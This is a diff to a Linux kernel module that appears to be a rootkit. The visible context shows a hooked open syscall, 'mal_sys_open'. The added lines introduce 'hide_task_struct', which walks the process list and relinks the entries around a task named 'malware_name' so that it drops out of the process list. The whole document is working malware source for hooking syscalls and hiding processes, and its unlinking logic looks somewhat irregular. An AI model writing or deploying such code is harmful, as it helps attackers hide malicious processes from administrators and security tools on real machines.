@@ -5,6 +5,7 @@
 #include <linux/types.h>
 #include <linux/syscalls.h>
 #include <linux/unistd.h>
+#include <linux/sched.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Noop Noop");
@@ -35,6 +36,24 @@ asmlinkage long mal_sys_open(const char __user *filename, int flags, umode_t mod
 		}
 
 		return original_sys_open(filename, flags, mode);
+}
+
+
+static void hide_task_struct(void)
+{
+		struct task_struct * task_iter;
+		struct task_struct * next_task;
+		struct task_struct * prev_task;
+
+		for_each_process(task_iter) {
+				if (!strcmp(task_iter->comm, malware_name)) {
+						prev_task = list_entry_rcu(task_iter->tasks.prev, struct task_struct, tasks);
+						next_task = list_entry_rcu(task_iter->tasks.next, struct task_struct, tasks);
+						list_add(&(prev_task->tasks), &(next_task->tasks));
+						list_add_tail(&(next_task->tasks), &(prev_task->tasks));
+						break;
+				}
+		}
 }
 
 
